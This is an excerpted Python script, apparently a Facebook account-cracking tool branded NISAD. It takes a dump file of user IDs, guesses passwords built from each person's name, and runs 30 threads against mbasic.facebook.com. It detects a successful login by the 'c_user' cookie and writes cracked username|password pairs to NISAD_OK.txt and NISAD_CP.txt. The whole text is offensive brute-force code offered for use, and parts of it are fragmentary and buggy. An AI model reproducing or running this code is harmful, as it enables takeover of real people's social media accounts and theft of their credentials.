...
from concurrent.futures import ThreadPoolExecutor as meithunNISAD
...
\033[2;99m╚════════════════════════════════════════════════╝
 ...
 \033[1;91m                         Hard Woark kye to sucees
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mNISAD_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mNISAD_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back NISAD Menu ")
	    meithun()
...
class __xxx__:
    def __init__(self):
        self.id = []
    def meithunx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input ('Enter Your DUMP File Name : ')
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [NISAD-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('NISAD_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [NISAD-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('NISAD_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        print('[D] Crack With Default Pass (V2)')
        print('[Y] Crack With Your Pass')
        chi = input('\n [?] Select : ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
            ...
            print(47*"-")
            print('\033[1;37m Total Account : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with meithunNISAD(max_workers=30) as NISADworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        NISADworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('Y', 'y'):
